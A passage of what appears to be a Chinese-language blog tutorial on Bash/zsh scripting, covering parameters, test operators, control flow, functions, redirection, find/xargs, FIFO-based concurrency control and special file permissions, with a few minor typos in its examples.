用空格分隔的所有参数$1 $2 $3 … $n</p></li><li><p>$* : 根据$IFS分隔所有参数</p><p><a href="http://c.biancheng.net/view/807.html">注：<code>$*</code> 和 <code>$@</code> 的区别</a></p></li></ul><p><code>$*</code> 和 <code>$@</code> 都表示传递给函数或脚本的所有参数，不被双引号(“ “)包含时，都以”$1” “<img src="https://juejin.cn/equation?tex=2%22%20%E2%80%A6%20%22" alt="2&quot; … &quot;">n” 的形式输出所有参数。</p><p>但是当它们被双引号(“ “)包含时</p><ul><li>  <code>&quot;$*&quot;</code> 会将所有的参数作为一个整体，以”$1 <img src="https://juejin.cn/equation?tex=2%20%E2%80%A6" alt="2 …">n”的形式输出所有参数；</li><li>  <code>&quot;$@&quot;</code> 会将各个参数分开，以”$1” “<img src="https://juejin.cn/equation?tex=2%22%20%E2%80%A6%20%22" alt="2&quot; … &quot;">n” 的形式输出所有参数。</li></ul><p>进程状态的相关参数</p><ul><li><code>$$</code>: 输出当前进程的进程号<PID></li><li><code>$!</code> : 输出后台运行的最后一个PID</li><li><code>$_</code>: 输出上一条命令的最后一个参数 </li></ul><p>exit <n> # 设置返回状态码</p><ul><li>$? : 输出上条命令执行后的返回值<ul><li>0 : 成功</li><li>1-255 : 不成功<ul><li>1 : 通用错误/执行失败</li><li>126 : 命令或脚本没执行权限</li><li>127 : 命令没找到</li></ul></li></ul></li></ul><pre><code class="zsh"># 练习脚本echo &quot;Hello,$USER, the output of this script are as follows:&quot;echo -e &quot;The script name is              : \t $(basename $0)&quot;echo -e &quot;The first param of the script is: \t $1&quot;echo -e &quot;The second param of the script is: \t $2&quot;echo -e &quot;The five param of the script is: \t $5&quot;echo -e &quot;All the params you input are: \t $@&quot;echo -e &quot;The PID of this script is: \t $$&quot;echo -e &quot;The exit status of this script is: \t $?&quot;</code></pre><h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><h3 id="整数运算符"><a href="#整数运算符" class="headerlink" title="整数运算符"></a>整数运算符</h3><p> <code>$[]</code>  和 <code>$((expression))</code> :+ - * / % **(幂)</p><h3 id="整数比较操作符号"><a href="#整数比较操作符号" class="headerlink" title="整数比较操作符号"></a>整数比较操作符号</h3><ol><li><code>[]</code>和<code>[[]]</code>的操作符号</li></ol><ul><li><code>[ int1 -eq int2 ]</code> : =   <code>((int1 == int2))</code> </li><li><code>[ int1 -ne int2 ]</code> : !=  <code>((int1 != int2))</code> </li><li><code>[ int1 -gt int2 ]</code> : &gt;  <code>((int1 &gt; int2))</code> </li><li><code>[ int1 -ge int2]</code> : &gt;=  <code>((int1 &gt;= int2))</code> </li><li><code>[ int1 -lt int2 ]</code> : &lt;   <code>((int1 &lt; int2))</code> </li><li><code>[ int1 -le int2 ]</code> : &lt;=  <code>((int1 &lt;= int2))</code> </li></ul><p>⚠️：<br><code>== != &lt; &gt;</code> 等操作符号在<code>[]</code> <code>[[]]</code>中使用需要转义,macOS中不可用此种方式</p><pre><code class="zsh">a=2;b=6; [ $a \&gt; $b ]; echo $?</code></pre><h3 id="字符串测试操作符号"><a href="#字符串测试操作符号" class="headerlink" title="字符串测试操作符号"></a>字符串测试操作符号</h3><pre><code class="zsh">str=Tom ;[ -z &quot;$str&quot; ]; echo $?</code></pre><ul><li><p><code>[ str ]</code> : $str不为空,返回真</p></li><li><p><code>[ -z str ]</code> : $str长度为0,返回真</p></li><li><p><code>[ -n str ]</code> : $str长度不为0,返回真</p></li><li><p><code>[ str1 = str2 ]</code> : 测试str1与str2相等,返回真</p></li><li><p><code>[ str1 != str2 ]</code> : 测试str1与str2不想等,返回真</p></li><li><p><code>[[ str1 == str2 ]]</code> : 测试str1与str2相同,返回真</p></li><li><p><code>[[ str1 != str2 ]]</code> : 测试str1与str2不相同,返回真</p></li><li><p><code>[[ str1 =~ str2 ]]</code> : str2是str1的子串,返回真</p></li><li><p><code>[[ str1 &gt; str2 ]]</code> : str1 大于str2,返回真</p></li><li><p><code>[[ str1 &lt; str2 ]]</code> : str1小于str2,返回真</p></li></ul><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>三元表达式: <code> [  ] &amp;&amp; echo T  || echo F</code></p><ol><li>常用方式:</li></ol><ul><li><code>[[ pattern1 &amp;&amp; pattern2 ]]</code> : 逻辑与</li><li><code>[[ pattern1 || pattern2 ]]</code> : 逻辑或</li><li><code>[[ !pattern ]]</code> : 逻辑非</li></ul><ol start="2"><li>不常用方式:</li></ol><ul><li><code>[ expr1 -a expr2 ]</code> : and</li><li><code>[ expr1 -o expr2 ]</code> : or</li><li><code>[ !expr ]</code> : 非！<pre><code class="zsh">x=1;name=Tom; [ $x -eq 1 -a -n $name ]; echo $?</code></pre></li></ul><h3 id="文件测试操作符号"><a href="#文件测试操作符号" class="headerlink" title="文件测试操作符号"></a>文件测试操作符号</h3><ul><li><p><code>[ -b fname ]</code> : fname为块设备,返回真</p></li><li><p><code>[ -c fname ]</code> : fname为字符设备,返回真</p></li><li><p><code>[ -p fname ]</code> : fname为命名管道,返回真</p></li><li><p><code>[ -S fname ]</code> : fname为Socket,返回真</p></li><li><p><code>[ -s fname ]</code> : fname存在且size&gt;0,返回真</p></li><li><p><code>[ -f fname ]</code> : fname存在且是普通文件,返回真</p></li><li><p><code>[ -L fname ]</code> : fname存在且是链接文件,返回真 </p></li><li><p><code>[ -e fname ]</code> : fname(文件或目录)存在,返回真</p></li><li><p><code>[ -d fname ]</code> : fname存在且是目录,返回真</p></li><li><p><code>[ -r fname ]</code> : fname(文件或目录)存在且可读,返回真</p></li><li><p><code>[ -w fname ]</code> : fname(文件或目录)存在且可写,返回真</p></li><li><p><code>[ -x fname ]</code> : fname(文件或目录)存在且可执行,返回真</p></li></ul><h1 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h1><h2 id="顺序语句"><a href="#顺序语句" class="headerlink" title="顺序语句"></a>顺序语句</h2><p>程序会顺序来执行代码，从上往下一行一行执行</p><h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><p>条件测试语句格式：</p><blockquote><p>[ <expression> ]   等效于test <expression><br>[[ <expression> ]]   </p></blockquote><p>区别：</p><ul><li><code>[]</code> 不支持逻辑运算符、正则表达式</li><li><code>[[]]</code> 支持逻辑运算符&amp;&amp;、||、!、和()，支持正则表达式匹配</li></ul><h3 id="if型"><a href="#if型" class="headerlink" title="if型"></a>if型</h3><ul><li><code>if</code>语句可嵌套使用</li><li>必须以<code>if</code>开头，<code>fi</code>结尾</li><li><code>elif</code> 可以有<code>0个或多个</code></li><li><code>else</code>最多只能有个一个</li><li><code>commands</code>为可执行语句块,shell提供空命令<code>:</code></li><li><code>;</code> 相当于命令换行</li></ul><pre><code class="zsh">if [ expr1 ]; then  &lt;commands1&gt;   #expr1为真时，执行commands1elif [ expr2 ]; then  &lt;commands2&gt;   # expr1为假，expr2为真时，执行commands2elif [ expr3 ]; then  &lt;commands3&gt;   # expr1到expr2为假，expr3为真时，执行commands3    ...elif [ exprn ]; then  &lt;commandsn&gt;   # expr1到expr(n-1)为假，exprn为真时，执行commandsnelse  &lt;command&gt;   # 当expr(1-n)都为假时，执行command fi</code></pre><h3 id="case型"><a href="#case型" class="headerlink" title="case型"></a>case型</h3><pre><code class="zsh">case $expr in             pattern1)         # 若expr与pattern1匹配,    commands1       # 执行语句块commands    ;;              # 跳出case结构  pattern2)    commands2    ;;  *)                # 若expr与上面的pattern均不匹配    commands            ;;esac                # case语句必须以easc终止</code></pre><h3 id="select型"><a href="#select型" class="headerlink" title="select型"></a>select型</h3><blockquote><p>while+case语句可实现select</p></blockquote><pre><code class="zsh">select answer in &lt;list&gt;; do  commands                     # 循环变量answer每取一次值，循环体commands就执行一遍done                           # 循环结束标志</code></pre><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><ul><li><code>break</code> 强行退出本层循环。  <code>break [n]</code> 退出第几层循环(最里面为第一层循环)</li><li><code>continue</code> 忽略本次循环的剩余部分，回到循环的顶部,继续下一次循环。 <code>continue [n]</code> 回到第n次循环的顶部</li></ul><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><ul><li>python格式</li></ul><pre><code class="zsh">for item in list ; do  commandsdone</code></pre><ul><li>C语言格式(不常用)</li></ul><pre><code class="zsh">for ((i=0;i&lt;100;i++))do  echo $idone</code></pre><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><blockquote><p>与until作用相反</p></blockquote><pre><code class="zsh">while expr ; do       # 执行expr表达式是否为真  commands            # 循环体语句done [&lt; test.file]      # 循环结束标志,返回循环顶部</code></pre><h3 id="until循环"><a href="#until循环" class="headerlink" title="until循环"></a>until循环</h3><blockquote><p>与while作用相反</p></blockquote><pre><code class="zsh">until expr ; do      # 执行expr表达式是否为假,   expr为真退出循环  commands           # expr退出状态为假, 执行循环体commandsdone                 # 循环体结束标志, 返回循环顶部</code></pre><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>关键字<code>function</code>和<code>重定向</code>命令可选</p><pre><code class="zsh">[function] myfun()&#123;  commands     # body of the funtion goes here  [break]      # 退出当前函数  [exit &lt;n&gt;]   # 退出整个脚本  [return &lt;n&gt;] # 退出当前函数。未指定n，则返回函数最后一条milling执行后所返回的状态  &#125; [重定向]myfun [arg1 arg2 ... argn]   # 运行函数,arg参数通过位置参数$n传入echo $?       # 查看函数myfun返回值</code></pre><p>⚠️</p><ul><li>作用域: 函数内的变量的作用域默认是全局的，可使用<code>local</code>限定作用域于函数内</li><li>函数定义中不必声明参数个数，参数个数由此函数被调用时给定。</li></ul><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><h2 id="打印变量"><a href="#打印变量" class="headerlink" title="打印变量"></a>打印变量</h2><pre><code class="zsh">#! /bin/bashecho $var ; exit   # 单独调试某个变量 trap &quot;echo a=$a b=$b&quot;  EXIT   # 程序退出打印程序内的变量  a=20b=30exit</code></pre><h2 id="sh命令参数"><a href="#sh命令参数" class="headerlink" title="sh命令参数"></a>sh命令参数</h2><pre><code class="zsh">bash [-n | -v | -x]  &lt;file.sh&gt;-n : 仅模糊检查语法错误,不执行file.sh脚本。-x : 打印每条命令的结果</code></pre><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><ul><li><code>help</code> 查看shell内置命令</li></ul><pre><code class="zsh">ssh myserver ps &gt; /tmp/ps.out  #重定向到本地/tmp目录ssh myserver ps \&gt; /tmp/ps.out #重定向到服务器/tmp目录 </code></pre><ul><li><code>. aa.sh</code> : 在当前shell环境下执行aa.sh内的命令</li></ul><h2 id="子shell运行"><a href="#子shell运行" class="headerlink" title="子shell运行"></a>子shell运行</h2><ul><li><code>export &lt;variables&gt;[=value]</code> : 导出指定变量到子shell中</li></ul><pre><code class="zsh">var1=value1 var2=value2 ... varn=valuen  command</code></pre><p>将var[1-n]及其值放入到command环境中,执行command。当前shell不存在变量var[1-n]</p><h2 id="异步执行-wait-PID"><a href="#异步执行-wait-PID" class="headerlink" title="异步执行 wait [PID]"></a>异步执行 <code>wait [PID]</code></h2><pre><code>wait [PID]   # 不写PID, 则shell会等待所有的子进程执行完毕。在子进程执行完毕前,当前shell会被挂起。</code></pre><h2 id="命令组"><a href="#命令组" class="headerlink" title="命令组"></a>命令组</h2><ul><li><code>(commands ...)</code> : 在子shell中运行</li><li><code>&#123; command;..;&#125;</code> : 在当前shell中运行, 开头有<code>空格</code>,命令后带<code>;</code></li></ul><h2 id="转义符"><a href="#转义符" class="headerlink" title="转义符\"></a>转义符<code>\</code></h2><p>转义就是转成字符字面含义<br><code>\x</code> : 使用x字符的字面意义。</p><h2 id="引号’’-“”"><a href="#引号’’-“”" class="headerlink" title="引号’’ “”"></a>引号’’ “”</h2><ul><li><code>&#39;&#39;</code> 单引号不能嵌套,引号内的所有字符转义,即保持字面含义。</li><li><code>&quot;&quot;</code> 双引号内的字符,含有转义符<code>\</code> 后跟$、`、&quot; 、\保持特殊含义，不转义。</li></ul><h2 id="参数左移shift-n"><a href="#参数左移shift-n" class="headerlink" title="参数左移shift [n] "></a>参数左移<code>shift [n] </code></h2><p>shell命令将shell程序的参数$1 …$n分别向左移动n位。</p><h2 id="单字符参数处理getopts"><a href="#单字符参数处理getopts" class="headerlink" title="单字符参数处理getopts"></a>单字符参数处理<code>getopts</code></h2><pre><code class="zsh">getopts &lt;optstring&gt;  &lt;opt&gt;  [arg...]</code></pre><ul><li><code>optstring</code> : 代表参数字符串, 开头含有<code>:</code>,表示不打印错误信息<ul><li>eg: <code>aa.sh -a -b -p value</code>     </li><li><code>optstring</code>就是<code>abp:</code> , <code>-a -b</code>为开关型选项     </li><li> 当getopts匹配到-p参数时, <code>value</code>会被存放在shell内置变量<code>OPTARG</code>中 </li></ul></li><li><code>opt</code> : getopts存放参数名的变量, 参数对应的值存在<code>OPTARG</code> <ul><li>每次执行getopts,会从命令行中获取下一个参数，存放在<code>name</code>中  </li><li> 如果获取的参数不在<code>optstring</code>中, <code>name</code>的值为<code>?</code></li></ul></li><li><code>arg</code> : 默认是<code>$@</code>, 即shell脚本的全部参数</li><li><code>OPTIND</code> : 存放所有参数的下标, 开关型参数下标=1  含参型下标=2</li></ul><h2 id="多字符参数处理getopt"><a href="#多字符参数处理getopt" class="headerlink" title="多字符参数处理getopt"></a>多字符参数处理<code>getopt</code></h2><h2 id="shell环境变量"><a href="#shell环境变量" class="headerlink" title="shell环境变量"></a>shell环境变量</h2><ul><li><code>HOME</code> : 存放用户主目录的完整路径名</li><li><code>PATH</code> : shell执行命令时顺序搜索可执行文件</li><li><code>TERM</code> : 终端类型</li><li><code>UID</code> : 当前用户标识</li><li><code>PS1</code> : 主提示符</li><li><code>PS2</code> : 辅助提示符</li><li><code>PS4</code> : <code>set -x</code> 模式下的提示符,默认+</li><li><code>IFS</code> : 输入域分隔符</li></ul><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><table><thead><tr><th align="center">形式</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&lt; file</td><td align="center">标准输入重定向到file,将file内容输入到终端里</td></tr><tr><td align="center">&gt; file</td><td align="center">标准输出重定向到file</td></tr><tr><td align="center">command &lt; file1 &gt;file2</td><td align="center">将 file1 作为 command 的输入，并将 command 的处理结果输出到 file2。</td></tr></tbody></table><ul><li><p>重定向标准输出及标准错误</p><pre><code class="zsh">`commands`&gt;file 2&gt;&amp;1   等效于   &amp;&gt;file    等效于  &gt;&amp;file</code></pre><p>按照重定向符号的顺序自左至右执行，<br>首先标准输出重定向至file中，<br>2&gt;&amp;1 表示将标准错误重定向至标准输出</p></li><li><p>追加重定向标准输出及标准错误</p><pre><code class="zsh">`command` &gt;&gt; file 2&gt;&amp;1   等效于 &amp;&gt;&gt; file</code></pre></li></ul><h2 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换"></a>命令替换</h2><p>将命令的输出作为命令替换位置的文本</p><p>var=<code>ps -ef |wc -l</code><br>var=$(ps -ef | wc -l)</p><ul><li><code>$&#123;&#125;</code> :用于定义变量</li><li><code>$()</code> : 用于命令替换,等效于` `</li><li> <code>$[ ] </code> 和<code>$(())</code>: 用于整数运算 </li></ul><h2 id="脚本执行结束清理缓存文件"><a href="#脚本执行结束清理缓存文件" class="headerlink" title="脚本执行结束清理缓存文件"></a>脚本执行结束清理缓存文件</h2><pre><code class="zsh">#!/bin/bash # trap捕捉到EXIT信号时执行rm -f &quot;$TMPFILE&quot; 命令# 最好放在shell脚本的开头# trap  &lt;command | function &gt;  &lt;SIGNAL&gt; SINGAL2 ...SINGALNtrap &#39;rm -f &quot;$TMPFILE&quot;&#39; EXITTMPFILE=$(mktemp) || exit 1ls /etc &gt; $TMPFILEif grep -qi &quot;kernel&quot; $TMPFILE; then  echo &#39;find&#39;fi</code></pre><h2 id="根据扩展名切分文件名"><a href="#根据扩展名切分文件名" class="headerlink" title="根据扩展名切分文件名"></a>根据扩展名切分文件名</h2><p>文件名格式:<code>name.extention</code></p><ul><li><code>%</code> : 提取文件名name部分</li><li><code>#</code> : 提取文件名extention部分<pre><code class="zsh">file=&quot;sample.jpg&quot;</code></pre></li></ul><p>echo “文件名: ${file%.<em>}”  # 从file中删除位于%右侧通配符(.</em>)匹配到的字符,匹配方向从右向左匹配,非贪婪模式,贪婪模式加%%<br>echo “扩展名: ${file#<em>.}”  # 从file中删除位于#右侧通配符(</em>.)匹配到的字符串,匹配方向从左到右匹配,非贪婪模式,贪婪模式加##</p><pre><code>## shell命令行使用vi行编辑模式修改命令时，不管处于哪种模式，按下`Enter`就会解释当前命令。```zshset -o vi/emacs</code></pre><h2 id="set命令切分字段"><a href="#set命令切分字段" class="headerlink" title="set命令切分字段"></a>set命令切分字段</h2><pre><code class="zsh">aa=&quot;aa bb cc&quot;# set $aa会将aa的值根据IFS来切分赋给位置参数set $aaecho $1echo $2echo $3</code></pre><h2 id="GUI界面Dialog"><a href="#GUI界面Dialog" class="headerlink" title="GUI界面Dialog"></a>GUI界面Dialog</h2><h2 id="终端颜色"><a href="#终端颜色" class="headerlink" title="终端颜色"></a>终端颜色</h2><h3 id="tput显示颜色"><a href="#tput显示颜色" class="headerlink" title="tput显示颜色"></a>tput显示颜色</h3><ul><li><code>tput setab &lt;num&gt;</code> : 设置背景色</li><li><code>tput setaf &lt;num&gt;</code> : 设置前景色</li></ul><p>|||||||<br>|—|—|—|—|—|—|—|<br>|&lt;num&gt;|0|1|2|3|4|5|6|7|<br>|color|黑|红|绿|黄|蓝|洋红|黄|白|</p><pre><code class="zsh">RED=$(tput setaf 1)GREEN=$(tput setaf 2)RESET=$(tput sgr0)   # sgr0 表示颜色重置echo &quot;$&#123;RED&#125;red text $&#123;GREEN&#125;green text$&#123;RESET&#125;&quot;</code></pre><h2 id="bash注释"><a href="#bash注释" class="headerlink" title="bash注释"></a>bash注释</h2><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释 #"></a>单行注释 #</h3><pre><code class="zsh"># 单行注释符: commnets here</code></pre><h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><ol><li><p>方式一</p><pre><code class="zsh">&lt;&lt; COMMENTcomment here....comment hereCOMMENT</code></pre></li><li><p>方式二</p><pre><code class="zsh">:&#39;commnet here...commnet here&#39;</code></pre></li></ol><h2 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h2><pre><code class="zsh">&lt;command&gt;    # 按下ctrl-z即可挂起该进程</code></pre><ul><li><code>fg</code> : 在前台恢复执行当前作业 </li><li><code>bg</code> : 在后台恢复执行当前作业</li></ul><h2 id="切换目录cd"><a href="#切换目录cd" class="headerlink" title="切换目录cd -"></a>切换目录<code>cd -</code></h2><ul><li><code>-</code> 表示上一个目录</li></ul><h2 id="开发规范"><a href="#开发规范" class="headerlink" title="开发规范"></a>开发规范</h2><pre><code class="zsh"># Date: 2020-8-8 8:8:8# Author: askDing# Blog: https://askding.github.io## Version: 1.1# Description: </code></pre><h2 id="分割-合并文件"><a href="#分割-合并文件" class="headerlink" title="分割/合并文件"></a>分割/合并文件</h2><ul><li>分割文件<pre><code class="zsh">cut -f &lt;col_list&gt; -d &#39;;&#39; --complenment  --output-delimiter &#39;-&#39; file  # 按列切分文件 -f 指定待提取的列号# -d 指定分隔符# --complenment 输出-f指定之外的所有列# --output-delimiter 指定输出分隔符split [-b size] [-d [-a &lt;num&gt;]]  file  # -b指定分割文件的大小10k、10M、10G、# -d 以数字为后缀# -a num 指定后缀的长度</code></pre></li><li>合并文件<pre><code class="zsh">cat file1 file2 ... &gt; file_total  # 按行合并文件paste file1 file2 ... -d &#39;,&#39; # 按列合并文件,-d指定分隔符</code></pre></li></ul><h2 id="cat的特殊用法"><a href="#cat的特殊用法" class="headerlink" title="cat的特殊用法"></a>cat的特殊用法</h2><pre><code class="zsh">echo &quot;aa bb cc&quot; | cat - other_file   # - 作为stdin文本的文件名</code></pre><h2 id="终端截图"><a href="#终端截图" class="headerlink" title="终端截图"></a>终端截图</h2><pre><code class="zsh">xwd -root -out /tmp/xwd_test.xwd  # 截取整个屏幕,不需要鼠标选择区域xwud -in /tmp/xwd_test.xwd      # 查看截屏文件convert /tmp/xwd_test.xwd  /tmp/xwd_test.png   # 转换成png格式图片</code></pre><h2 id="script录制终端会话"><a href="#script录制终端会话" class="headerlink" title="script录制终端会话"></a>script录制终端会话</h2><pre><code class="zsh">script -t 2&gt; rec.time  -a rec.his # 开始录制 -t 记录时序 -a 追加输出到文件, -a可忽略exit                              # 结束录制scriptreplay  -t  rec.time  -s  rec.his   # 回放 -t -s可省略</code></pre><h2 id="termtosvg生成svg动画"><a href="#termtosvg生成svg动画" class="headerlink" title="termtosvg生成svg动画"></a>termtosvg生成svg动画</h2><p><a href="https://nbedos.github.io/termtosvg/">termtosvg</a></p><pre><code class="zsh">brew install termtosvgtermtosvgexit</code></pre><h2 id="find命令技巧"><a href="#find命令技巧" class="headerlink" title="find命令技巧"></a>find命令技巧</h2><pre><code class="zsh">find . -type f -name &quot;*.a&quot; -print0  -exec rm  &#123;&#125; \;     find . \(-path &quot;./code&quot; -o -path &quot;./code2&quot; \) -prune -o -name &quot;*.txt&quot; -print     //在当前目录及除code和code2之外的子目录中查找txt文件# 可用于删除-开头的文件,  # -print0 使用0(NULL)字符分割查找到的元素# &#123;&#125;代表find出的文件名 # \; 对;进行转义,代表rm命令的结束</code></pre><h2 id="xargs命令技巧"><a href="#xargs命令技巧" class="headerlink" title="xargs命令技巧"></a>xargs命令技巧</h2><p>一般情况下可使用``来执行命令，然后将其输出作为命令行参数，达到使用只能接收命令行参数的命令,<br>但需要处理的文件过多,会出现”Argument list too long”的错误。可使用xargs来解决</p><pre><code class="zsh">&lt;command1&gt; | xargs [-n] [-d &#39;X&#39;]  [-I &#123;&#125;]  [command2 -p &#123;&#125; -l] # -n 限制每行输出n个元素, 输出m行,command2命令执行m次 # -d &#39;X&#39;  以X作为分隔符分割command1输出的内容# -I &#123;&#125; 以&#123;&#125;位置作为xargs传递给command 的参数位置# 使用-I时,command2以循环的方式执行。如果m=3，command2连同&#123;&#125;一起执行3次,&#123;&#125;会在每次执行中被替换为相应的参数</code></pre><p><code>xargs</code> 紧跟在管道操作符<code>|</code>之后,  默认使用执行<code>/bin/echo</code>。<br>将数据以空格或换行符分隔成单个元素，然后调用指定命令并将这些元素作为该命令的参数,  类似于<code>find -exec</code>  </p><pre><code class="zsh">cat target.txt | xargs  # 多行输入转单行输出cat args.txt | xargs -I &#123;&#125; ./aa.sh -p &#123;&#125; -l # -I &#123;&#125; 指定aa.sh命令执行时替换字符串的位置标识find /smbMount  -iname &quot;*.docx&quot; -print0 | xargs -0 grep &quot;askDing&quot;  # -iname 忽略大小写, -print0 -0都是以0作为分隔符 </code></pre><h2 id="并发执行-amp-amp"><a href="#并发执行-amp-amp" class="headerlink" title="并发执行()&amp;/{}&amp;"></a>并发执行()&amp;/{}&amp;</h2><p>主要方法是使用 &amp; 符号，将命令fork到后台执行,然后配合wait等待进程结束</p><pre><code class="zsh">for ip in 192.168.8.&#123;1..255&#125;; do  (    ping $ip -c2 &amp;&gt; /dev/null    if [ $? -eq 0 ]; then      echo $ip is alive    fi)&amp;donewait</code></pre><h2 id="利用管道和文件描述符FD-id实现并发数控制"><a href="#利用管道和文件描述符FD-id实现并发数控制" class="headerlink" title="利用管道和文件描述符FD_id实现并发数控制"></a>利用管道和文件描述符FD_id实现并发数控制</h2><ul><li>FD关联命令管道,具有管道特性，并且可以 无限存不阻塞，无限取不阻塞，而不用关心管道内是否为空，也不用关心是否有内容写入</li><li>命名管道控制并发数</li><li>操作FD</li></ul><ol><li>创建一个管道并用指定FD_ID打开 <code>mkfifo /tmp/$$.fifo; exec 3&lt;&gt;/tmp/$$.fifo</code> 以当前进程PID创建fifo文件，防止冲突</li><li>循环向FD_ID(关联到管道)输入任意字符(建议echo输入空白字符\n)    &gt;创建进程数</li><li>在循环体中，通过<code>read -u &lt;文件描述符&gt;</code> 读取管道中的数据，执行命令，然后<code>echo &gt;&amp;FD_ID</code>,补充进程数  &gt;执行程序</li><li>全部任务完成后，<code>exec FD_ID&lt;&amp;- &amp;&amp; exec FD_ID&gt;&amp;-</code> 关闭管道</li></ol><h3 id="mkfifo介绍"><a href="#mkfifo介绍" class="headerlink" title="mkfifo介绍"></a>mkfifo介绍</h3><p>管道具有存一个读一个，读完一个就少一个，没有则阻塞，放回的可以重复取，这正是队列特性</p><pre><code class="shell">[ -e /tmp/$$.fifo ] || mkfifo /tmp/$$.fifo  # 创建命名管道exec 3&lt;&gt; /tmp/$$.fifo                       # 将FD关联到管道rm -rf /tmp/$$.fifo                         # 删除管道文件，FD具有管道的一切特性，可通过FD来操作echo &gt;&amp;8                                    # 向FD内输入`\n`</code></pre><h3 id="exec命令、操作文件描述符"><a href="#exec命令、操作文件描述符" class="headerlink" title="exec命令、操作文件描述符"></a>exec命令、操作文件描述符</h3><ol><li>exec操作命令或脚本时：</li></ol><ul><li><code>exec xx.sh</code> : xx.sh会替换当前进程, 执行xx.sh，就不会再返回调用exec的程序。</li></ul><ol start="2"><li>exec操作文件描述符时：</li></ol><ul><li><code>exec 3&lt;/tmp/1.txt</code> 以只读方式打开/tmp/1.txt文件，文件描述符为3</li><li><code>exec 3&gt;/tmp/1.txt</code> 以只写方式打开/tmp/1.txt文件，文件描述符为3</li><li><code>exec 3&lt;&gt;/tmp/1.txt</code> 以读写方式打开/tmp/1.txt文件，文件描述符为3</li><li><code>exec 3&lt;&amp;-</code> 关闭文件描述符3的读</li><li><code>exec 3&gt;&amp;-</code> 关闭文件描述符的写</li></ul><pre><code class="shell">#!/bin/bashthread=10                                 # 定义进程数start_time=`date +%s`                       [ -e /tmp/$$.fifo ] || mkfifo /tmp/$$.fifo # 创建命名管道文件exec 3&lt;&gt; /tmp/$$fifo                      # 创建FD 3，以可读（&lt;）可写（&gt;）的方式关联管道文件，FD 3具有命名管道的特性rm -rf /tmp/$$fifo                        # 删除命名管道文件，通过FD 3for i in $(seq $thread); do    echo &gt;&amp;3                              # 循环$thread次向FD 3写入\n , 类比一个令牌 donefor i in $(seq 1000); do    read -u 3                             # 循环读取FD 3中取\n , 直到读取位置    &#123;    # 需要并行执行的命令放在此处    sleep 1 &amp;&amp; echo &quot;$i  Done&quot;    # 最后需要归还令牌    echo &gt;&amp;3                          # 再次向FD 3写入\n , 类似归还令牌    &#125;&amp;                                    # 并发执行标志&#123;&#125;&amp;，fork放在后台执行donewait                                      # 等待并发进程执行完毕，执行后续命令 stop_time=`date +%s`echo &quot;TIME: `expr $stop_time-$start_time`&quot;        exec 3&lt;&amp;-                                 # 关闭FD 3的读exec 3&gt;&amp;-                                 # 关闭FD 3的写</code></pre><h2 id="监视命令输出"><a href="#监视命令输出" class="headerlink" title="监视命令输出"></a>监视命令输出</h2><pre><code class="zsh">watch [-d] [-n &lt;num&gt;] command  # 每隔num秒更新一次command命令的输出, -d 标记输出差异</code></pre><h2 id="特殊文件权限-S-t-T"><a href="#特殊文件权限-S-t-T" class="headerlink" title="特殊文件权限  S t/T"></a>特殊文件权限  S t/T</h2><p>权限模式</p><table><thead><tr><th>文件类型</th><th>所有者</th><th>所属组</th><th>其他用户</th></tr></thead><tbody><tr><td>-/b/c/d/l/p/s</td><td>r w x</td><td>r w x</td><td>r w x</td></tr></tbody></table><p>特殊权限均出现在执行权限(x)的位置</p><ul><li><code>setuid权限</code> 允许其他用户执行此(ELF格式的二进制)文件会以文件拥有者的权限来运行 <code>-rwS------</code>  <pre><code class="zsh">chmod u+s executeable_file   </code></pre></li><li><code>setgid权限</code> 其他用户运行此文件时具有所属组权限<code>----rwS---</code><pre><code class="zsh">chmod g+s  directory_name/executeable_file #一般设置目录 ,该目录下的文件集成该目录的属性</code></pre></li><li><code>目录sticky bit</code>  针对其他用户设置的,只有目录/文件所有者和root才能删除的文件<code>-------rwt</code>或<code>---------T</code> 如<code>/tmp</code>目录  <ul><li><code>t</code> 表示目录内文件有可执行权限</li><li><code>T</code> 表示目录内文件无可执行权限<pre><code class="zsh">chmod o+t &lt;directory_name&gt;</code></pre></li></ul></li></ul><h2 id="正则表达式可视化工具"><a href="#正则表达式可视化工具" class="headerlink" title="正则表达式可视化工具"></a>正则表达式可视化工具</h2><p><a href="https://regexper.com/">Regexpr</a></p><h2 id="对别名进行转义"><a href="#对别名进行转义" class="headerlink" title="对别名进行转义"></a>对别名进行转义</h2><p>在不可信环境下执行特权命令时，在命令前加上<code>\</code>忽略可能存在的别名</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sleep</title>
      <link href="Evolution/sleep.html"/>
      <url>Evolution/sleep.html</url>
      
